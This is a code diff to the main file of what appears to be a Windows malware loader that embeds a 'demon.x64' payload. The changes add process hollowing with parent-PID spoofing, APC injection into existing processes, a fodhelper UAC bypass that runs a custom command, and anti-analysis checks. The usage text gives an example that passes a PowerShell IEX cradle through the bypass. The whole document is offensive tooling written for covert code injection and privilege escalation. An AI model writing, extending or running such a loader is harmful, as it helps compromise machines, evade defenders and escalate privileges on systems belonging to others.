@@ -11,26 +11,54 @@
 #include "uac_bypass.hpp"
 #include "demon.x64.h"
 
+enum class InjectionMode { DEFAULT, HOLLOW, APC, UAC };
+
 struct Config {
     bool verbose = false;
-    bool do_hollow = false;
-    bool do_apc = false;
-    bool do_uac = false;
+    bool anti_analysis = false;
+    InjectionMode mode = InjectionMode::DEFAULT;
     DWORD target_pid = 0;
+    DWORD spoof_ppid = 0;
     std::string target_process = "svchost.exe";
+    std::string custom_command = "";
 };
 
 void print_usage(const char* prog) {
-    std::cout << "Usage: " << prog << " [OPTIONS]\n";
-    std::cout << "  -v, --verbose       Enable debug output\n";
-    std::cout << "  -h, --hollow        Process hollowing (default)\n";
-    std::cout << "  -p, --pid PID       APC injection into existing process\n";
-    std::cout << "  -u, --uac           UAC bypass via fodhelper\n";
+    std::cout << "\n=== AES Loader - Injection Modes ===\n\n";
+    std::cout << "Usage: " << prog << " [MODE] [OPTIONS]\n\n";
+    
+    std::cout << "MODE (pick one, default is spawn svchost + APC):\n";
+    std::cout << "  -m hollow           Process hollowing (create new process)\n";
+    std::cout << "  -m apc              APC injection into existing process (requires -p)\n";
+    std::cout << "  -m uac              UAC bypass via fodhelper\n\n";
+    
+    std::cout << "OPTIONS:\n";
+    std::cout << "  -v, --verbose       Enable verbose debug output\n";
     std::cout << "  -a, --anti          Run anti-analysis checks\n";
-    std::cout << "\nExamples:\n";
-    std::cout << "  " << prog << " -v -h              (hollowing + debug)\n";
-    std::cout << "  " << prog << " -v -p 1234         (APC inject PID 1234 + debug)\n";
-    std::cout << "  " << prog << " -v -u -a           (UAC bypass + anti-checks + debug)\n";
+    std::cout << "  -f, --file PATH     Target process to hollow (default: svchost.exe)\n";
+    std::cout << "  -p, --pid PID       PID for APC injection (required for -m apc)\n";
+    std::cout << "  --ppid PPID         Parent PID spoofing (works with hollow/apc spawn)\n";
+    std::cout << "  -c, --cmd COMMAND   Custom command for UAC mode (instead of relaunching)\n";
+    std::cout << "  -h, --help          Show this help\n\n";
+    
+    std::cout << "EXAMPLES:\n";
+    std::cout << "  " << prog << "\n";
+    std::cout << "    -> Spawn svchost + APC inject (default)\n\n";
+    
+    std::cout << "  " << prog << " -v\n";
+    std::cout << "    -> Spawn svchost + APC inject + verbose\n\n";
+    
+    std::cout << "  " << prog << " -m hollow -v\n";
+    std::cout << "    -> Hollow svchost + verbose\n\n";
+    
+    std::cout << "  " << prog << " -m hollow -f notepad.exe --ppid 500 -v\n";
+    std::cout << "    -> Hollow notepad with PPID spoof (parent: 500) + verbose\n\n";
+    
+    std::cout << "  " << prog << " -m apc -p 1464 -v\n";
+    std::cout << "    -> APC inject into existing PID 1464 + verbose\n\n";
+    
+    std::cout << "  " << prog << " -m uac -c \"powershell.exe -c 'IEX(...)'\"\n";
+    std::cout << "    -> UAC bypass + execute custom command\n\n";
 }
 
 Config parse_args(int argc, char* argv[]) {
@@ -45,11 +73,21 @@ Config parse_args(int argc, char* argv[]) {
         else if (arg == "-h" || arg == "--hollow") {
             cfg.do_hollow = true;
         }
+        else if (arg == "-f" || arg == "--file") {
+            if (i + 1 < argc) {
+                cfg.target_process = argv[++i];
+            } else {
+                std::cerr << "[-] -f/--file requires a path argument\n";
+                print_usage(argv[0]);
+                exit(1);
+            }
+        }
         else if (arg == "-p" || arg == "--pid") {
             if (i + 1 < argc) {
                 try {
-                    cfg.target_pid = std::stoul(argv[++i]);
-                    cfg.do_apc = true;
+                    DWORD pid = std::stoul(argv[++i]);
+                    cfg.target_pid = pid;
+                    // Don't set do_apc yet - it depends on whether -h is present
                 } catch (const std::invalid_argument& e) {
                     std::cerr << "[-] Invalid PID format: " << argv[i] << "\n";
                     print_usage(argv[0]);
@@ -57,6 +95,21 @@ Config parse_args(int argc, char* argv[]) {
                 }
             } else {
                 std::cerr << "[-] -p/--pid requires a PID argument\n";
+                print_usage(argv[0]);
+                exit(1);
+            }
+        }
+        else if (arg == "--ppid") {
+            if (i + 1 < argc) {
+                try {
+                    cfg.spoof_ppid = std::stoul(argv[++i]);
+                } catch (const std::invalid_argument& e) {
+                    std::cerr << "[-] Invalid PPID format: " << argv[i] << "\n";
+                    print_usage(argv[0]);
+                    exit(1);
+                }
+            } else {
+                std::cerr << "[-] --ppid requires a PID argument\n";
                 print_usage(argv[0]);
                 exit(1);
             }
@@ -76,6 +129,18 @@ Config parse_args(int argc, char* argv[]) {
     // Default to hollowing if nothing specified
     if (!cfg.do_hollow && !cfg.do_apc && !cfg.do_uac) {
         cfg.do_hollow = true;
+    }
+
+    // Smart flag resolution:
+    // If -h and -p are both present, use -p as PPID spoofing
+    // If only -p is present, use it for APC injection
+    if (cfg.do_hollow && cfg.target_pid != 0) {
+        // -h -p: use -p as PPID for hollowing
+        cfg.spoof_ppid = cfg.target_pid;
+        cfg.target_pid = 0;  // Clear target_pid so it's not used for APC
+    } else if (cfg.target_pid != 0 && !cfg.do_hollow) {
+        // -p alone: use for APC injection
+        cfg.do_apc = true;
     }
 
     return cfg;
@@ -177,12 +242,20 @@ int main(int argc, char* argv[]) {
             return -1;
         }
     }
-    else if (cfg.do_apc) {
-        // APC injection into existing process
-        std::cout << "[*] APC injection mode (PID " << cfg.target_pid << ")...\n";
+    else if (cfg.do_hollow) {
+        // Process hollowing (has priority over APC if both specified)
+        std::cout << "[*] Hollowing mode (target: " << cfg.target_process << ")...\n";
+        if (cfg.spoof_ppid != 0) {
+            std::cout << "[*] PPID spoofing enabled (target: " << cfg.spoof_ppid << ")...\n";
+        }
 
-        ProcessInjection injector(cfg.verbose);
-        if (injector.InjectViaAPC(cfg.target_pid, payload)) {
+        // Convert target_process to wide string
+        int wide_size = MultiByteToWideChar(CP_ACP, 0, cfg.target_process.c_str(), -1, nullptr, 0);
+        std::wstring target_wide(wide_size, 0);
+        MultiByteToWideChar(CP_ACP, 0, cfg.target_process.c_str(), -1, &target_wide[0], wide_size);
+
+        ProcessHollower hollower(cfg.verbose, cfg.spoof_ppid);
+        if (hollower.HollowProcess(target_wide.c_str(), payload)) {
             std::cout << "[+] SUCCESS\n";
             return 0;
         } else {
@@ -190,12 +263,12 @@ int main(int argc, char* argv[]) {
             return -1;
         }
     }
-    else if (cfg.do_hollow) {
-        // Process hollowing
-        std::cout << "[*] Hollowing mode...\n";
+    else if (cfg.do_apc) {
+        // APC injection into existing process
+        std::cout << "[*] APC injection mode (PID " << cfg.target_pid << ")...\n";
 
-        ProcessHollower hollower(cfg.verbose);
-        if (hollower.HollowProcess(fodpath_wide.c_str(), payload)) {
+        ProcessInjection injector(cfg.verbose);
+        if (injector.InjectViaAPC(cfg.target_pid, payload)) {
             std::cout << "[+] SUCCESS\n";
             return 0;
         } else {
